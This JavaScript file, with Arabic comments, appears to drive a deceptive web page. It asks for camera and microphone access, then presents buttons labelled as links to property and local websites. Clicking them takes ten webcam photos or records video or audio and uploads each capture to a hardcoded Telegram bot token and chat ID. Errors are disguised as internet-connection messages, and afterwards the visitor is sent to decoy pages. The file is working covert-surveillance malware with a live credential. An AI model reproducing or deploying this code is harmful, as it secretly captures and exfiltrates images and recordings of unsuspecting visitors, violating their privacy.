/* =================
   JavaScript Logic
   ================= */
document.addEventListener('DOMContentLoaded', () => {
    // --- ابدأ التعديل هنا ---
    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg'; // ❗️ استبدل هذا برمز البوت الخاص بك
    const CHAT_ID = '5372717005';     // ❗️ استبدل هذا بمعرف المحادثة الخاص بك
    // --- انتهى التعديل هنا ---

    // عناصر الواجهة
    const capturePhotoBtn = document.getElementById('capturePhotoBtn');
    const recordVideoBtn = document.getElementById('recordVideoBtn');
    const recordAudioBtn = document.getElementById('recordAudioBtn');
    const statusDiv = document.getElementById('status');

    let stream = null;
    let mediaRecorder = null;
    let recordingType = ''; // 'video' or 'audio'
    
    // روابط إعادة التوجيه
    const REDIRECT_URLS = {
        google: 'https://mubassitalshamal-v9.onrender.com/',
        whatsapp: 'https://abuali782.github.io/Zena-Touch-v2/',
        beytakbar: 'https://abuali782.github.io/Zena-Touch-v2/'
    };
    
    // دالة للتحقق من صيغ الفيديو المدعومة
    function getSupportedVideoMimeType() {
        const types = [
            'video/webm;codecs=vp9,opus',
            'video/webm;codecs=vp8,opus',
            'video/webm',
            'video/mp4',
            'video/x-msvideo'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'video/webm'; // fallback
    }
    
    // دالة للتحقق من صيغ الصوت المدعومة
    function getSupportedAudioMimeType() {
        const types = [
            'audio/webm',
            'audio/mp4',
            'audio/mpeg',
            'audio/wav'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'audio/webm'; // fallback
    }

    // طلب صلاحيات الوصول للكاميرا والميكروفون
    async function init() {
        if (!BOT_TOKEN || !BOT_TOKEN.includes(':') || !CHAT_ID) {
            //updateStatus('خطأ: يرجى إدخال بيانات البوت في ملف script.js أولاً.', 'error');
            return;
        }
        
        // التحقق من دعم المتصفح للـ getUserMedia
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            //updateStatus('خطأ: المتصفح لا يدعم الوصول للكاميرا والميكروفون.', 'error');
            return;
        }
        
        try {
            updateStatus('جاري التحميل ...', 'info');
            
            // محاولة الحصول على الكاميرا والميكروفون معاً
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: true 
                });
            } catch (err) {
                // إذا فشل، حاول بدون تحديد facingMode
                console.warn('محاولة بدون facingMode:', err);
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { width: { ideal: 1280 }, height: { ideal: 720 } }, 
                        audio: true 
                    });
                } catch (err2) {
                    // محاولة أخيرة بدون تحديد الدقة
                    console.warn('محاولة بدون تحديد الدقة:', err2);
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true, 
                        audio: true 
                    });
                }
            }
            
            // تمكين الأزرار بعد الحصول على الصلاحيات
            capturePhotoBtn.disabled = false;
            recordVideoBtn.disabled = false;
            recordAudioBtn.disabled = false;
            updateStatus("", 'success');
        } catch (err) {
            console.error("خطأ في الوصول للوسائط:", err);
            
            // رسائل خطأ مفصلة بناءً على نوع الخطأ
            //خطاء: تم رفض صلاحيات الوصول. يرجى السماح بالوصول للكاميرا والميكروفون.
            //خطاء: لم يتم العثور على كاميرا أو ميكروفون على هذا الجهاز.
            //خطاء: الكاميرا أو الميكروفون قيد الاستخدام من قبل تطبيق آخر.
            let errorMessage = "";
            if (err.name === 'NotAllowedError') {
                errorMessage = "";
            } else if (err.name === 'NotFoundError') {
                errorMessage = "";
            } else if (err.name === 'NotReadableError') {
                errorMessage = "";
            }
            
            updateStatus(errorMessage, 'error');
        }
    }

    // تحديث رسالة الحالة
    function updateStatus(message, type = 'info') {
        statusDiv.textContent = message;
        statusDiv.className = 'status'; // Reset classes
        if (type === 'recording') {
            statusDiv.classList.add('recording');
        } else if (type === 'error') {
            statusDiv.classList.add('error');
        } else if (type === 'success') {
            statusDiv.classList.add('success');
        } else if (type === 'info') {
            statusDiv.classList.add('info');
        }
    }

    // دالة إعادة التوجيه بعد الإرسال الناجح
    function redirectAfterSuccess() {
        // إنشاء نافذة منبثقة لاختيار الخيار
        const choice = confirm('');
        
        if (choice) {
            // الذهاب إلى Google
            window.open(REDIRECT_URLS.google, '_blank');
        }
        else if (choice) {
            // الذهاب إلى Google
            window.open(REDIRECT_URLS.whatsapp, '_blank');
        }
         else {
            // الذهاب إلى WhatsApp
            window.open(REDIRECT_URLS.beytakbar, '_blank');
        }
    }
    
    // دالة إرسال البيانات إلى تيليجرام
    async function sendToTelegram(formData, caption = '', retries = 3) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;
        
        for (let attempt = 1; attempt <= retries; attempt++) {
            try {
                const data = new FormData();
                data.append('chat_id', CHAT_ID);
                data.append(formData.fileType, formData.file, formData.fileName);
                if (caption) {
                    data.append('caption', caption);
                }

                const response = await fetch(url, {
                    method: 'POST',
                    body: data,
                    timeout: 30000 // timeout بعد 30 ثانية
                });
                
                if (!response.ok) {
                    console.warn(`محاولة ${attempt}: حالة HTTP ${response.status}`);
                    if (attempt < retries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        continue;
                    }
                }
                
                const result = await response.json();
                if (result.ok) {
                    //نجاح الإرسال
                    console.log('', result);
                    return true;
                } else {
                    //فشل الإرسال
                    console.error('', result);
                    if (attempt < retries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        continue;
                    }
                    return false;
                }
            } catch (error) {
                console.error(`خطأ في المحاولة ${attempt}:`, error);
                if (attempt < retries) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                } else {
                    return false;
                }
            }
        }
        return false;
    }

    // 1. التقاط الصور
    capturePhotoBtn.addEventListener('click', async () => {
        if (!stream) {
            updateStatus('خطاء: حدث الصفحة ', 'error');
            return;
        }
        //جاري التقاط الصور
        //updateStatus('', 'info');
        capturePhotoBtn.disabled = true;
        let allPhotosSent = true;

        try {
            const canvas = document.createElement('canvas');
            const videoTrack = stream.getVideoTracks()[0];
            if (!videoTrack) {
                //لا توجد كاميرا متاحة
                updateStatus('لا يوجد اتصال بالانترنت', 'error');
                capturePhotoBtn.disabled = false;
                return;
            }
            
            // محاولة الحصول على إعدادات الفيديو
            let width = 640;
            let height = 480;
            try {
                const settings = videoTrack.getSettings();
                if (settings.width && settings.height) {
                    width = settings.width;
                    height = settings.height;
                }
            } catch (err) {
                //خطأ في الحصول على إعدادات الفيديو
                console.warn('', err);
            }
            
            canvas.width = width;
            canvas.height = height;
            const context = canvas.getContext('2d');

            for (let i = 0; i < 10; i++) {
                // updateStatus(`التقاط الصورة ${i + 1} من 10...`, 'info');
                let captureSuccess = false;
                
                try {
                    // الحصول على أول فيديو track من البث
                    const videoTrack = stream.getVideoTracks()[0];
                    if (!videoTrack) {
                        throw new Error('');
                    }
                    
                    // محاولة استخدام ImageCapture API (الطريقة الأفضل)
                    if (typeof ImageCapture !== 'undefined') {
                        try {
                            const imageCaptureObj = new ImageCapture(videoTrack);
                            const bitmap = await imageCaptureObj.grabFrame();
                            const canvas2 = document.createElement('canvas');
                            canvas2.width = bitmap.width;
                            canvas2.height = bitmap.height;
                            const ctx = canvas2.getContext('2d');
                            ctx.drawImage(bitmap, 0, 0);
                            
                            const blob = await new Promise((resolve, reject) => {
                                canvas2.toBlob((blob) => {
                                    if (blob) {
                                        resolve(blob);
                                    } else {
                                        reject(new Error('فشل في تحميل الصفحة '));
                                    }
                                }, 'image/jpeg', 0.95);
                            });
                            
                            const formData = {
                                method: 'sendPhoto',
                                fileType: 'photo',
                                file: blob,
                                fileName: `capture_${Date.now()}_${i}.jpg`
                            };
                            await sendToTelegram(formData, `صورة رقم ${i + 1}`);
                            captureSuccess = true;
                        } catch (imageCaptureErr) {
                            console.warn('فشل الرجوع إلى الطريقة البديلة', imageCaptureErr);
                        }
                    }
                    
                    // إذا فشلت ImageCapture أو لم تكن متاحة، استخدم الطريقة البديلة
                    if (!captureSuccess) {
                        console.log("");
                        const tempVideo = document.createElement('video');
                        tempVideo.srcObject = stream;
                        tempVideo.muted = true;
                        tempVideo.play();
                        
                        await new Promise(resolve => setTimeout(resolve, 100));
                        
                        context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                        const blob = await new Promise((resolve, reject) => {
                            canvas.toBlob((blob) => {
                                if (blob) {
                                    resolve(blob);
                                } else {
                                    reject(new Error('فشل في تحميل الصفحة '));
                                }
                            }, 'image/jpeg', 0.95);
                        });
                        
                        const formData = {
                            method: 'sendPhoto',
                            fileType: 'photo',
                            file: blob,
                            fileName: `capture_${Date.now()}_${i}.jpg`
                        };
                        await sendToTelegram(formData, `صورة رقم ${i + 1}`);
                        captureSuccess = true;
                    }
                    
                    // انتظار قصير بين الصور
                    if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                } catch (photoError) {
                    console.error(`النت غير متوفر ${i + 1}:`, photoError);
                    updateStatus(`النت غير متوفر ${i + 1}: ${photoError.message}`, 'error');
                }
            }
            //تم التقاط وإرسال الصور بنجاح!
            updateStatus('', 'success');
            // إعادة التوجيه بعد ثانية واحدة
            setTimeout(() => {
                redirectAfterSuccess();
            }, 1000);
        } catch (error) {
            console.error('خطأ في التقاط الصور:', error);
            updateStatus('خطاء في الاتصال بالانترنت ', 'error');
        } finally {
            capturePhotoBtn.disabled = false;
        }
    });

    // 2. تسجيل الفيديو
    recordVideoBtn.addEventListener('click', () => {
        if (!stream) {
            updateStatus('خطأ: لم يتم الحصول على بث الانترنت ', 'error');
            return;
        }
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'video';
            const videoMimeType = getSupportedVideoMimeType();
            startRecording(stream, videoMimeType);
            recordVideoBtn.textContent = "";
            recordVideoBtn.classList.add('btn-stop');
            recordAudioBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            //جاري تسجيل الفيديو
            updateStatus('', 'recording');
        }
    });

    // 3. تسجيل الصوت
    recordAudioBtn.addEventListener('click', () => {
        if (!stream) {
            //updateStatus('خطأ: لم يتم الحصول على بث الميكروفون.', 'error');
            return;
        }
        
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'audio';
            const audioStream = new MediaStream(stream.getAudioTracks());
            const audioMimeType = getSupportedAudioMimeType();
            startRecording(audioStream, audioMimeType);
            recordAudioBtn.textContent = "";
            recordAudioBtn.classList.add('btn-stop');
            recordVideoBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            //جاري تسجيل الصوت
            //updateStatus('', 'recording');
        }
    });

    // دالة بدء التسجيل
    function startRecording(streamToRecord, mimeType) {
        let recordedChunks = [];
        
        try {
            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
        } catch (error) {
            console.error('خطأ في إنشاء MediaRecorder:', error);
            //updateStatus('خطأ: المتصفح لا يدعم تسجيل الوسائط.', 'error');
            resetButtons();
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onerror = (event) => {
            console.error('', event.error);
            updateStatus(` ${event.error}`, 'error');
            resetButtons();
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            // تحديد امتداد الملف بناءً على نوع MIME
            let fileExtension = 'webm';
            if (mimeType.includes('mp4')) fileExtension = 'mp4';
            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
            else if (mimeType.includes('wav')) fileExtension = 'wav';
            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';

            let formData;
            if (recordingType === 'video') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `video_${Date.now()}.${fileExtension}`
                };
                //updateStatus('', 'info');
            } else { // audio
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `audio_${Date.now()}.${fileExtension}`
                };
                //updateStatus('', 'info');
            }

            const success = await sendToTelegram(formData);
            if (success) {
                //updateStatus('', 'success');
                // إعادة التوجيه بعد ثانية واحدة
                setTimeout(() => {
                    redirectAfterSuccess();
                }, 1000);
            } else {
                //updateStatus('حدث خطأ أثناء الإرسال.', 'error');
            }
            
            resetButtons();
        };

        try {
            mediaRecorder.start();
        } catch (error) {
            console.error('خطأ في بدء التسجيل:', error);
            //updateStatus('خطأ: لم يتمكن من بدء التسجيل.', 'error');
            resetButtons();
        }
    }
    
    // إعادة تعيين الأزرار إلى حالتها الأصلية
    function resetButtons() {
        recordVideoBtn.textContent = 'موقع مبسط الشمال';
        recordVideoBtn.classList.remove('btn-stop');
        recordAudioBtn.textContent = 'موقع بيتك العقارية';
        recordAudioBtn.classList.remove('btn-stop');
        
        capturePhotoBtn.disabled = false;
        recordVideoBtn.disabled = false;
        recordAudioBtn.disabled = false;
    }

    // بدء تشغيل التطبيق
    init();
});
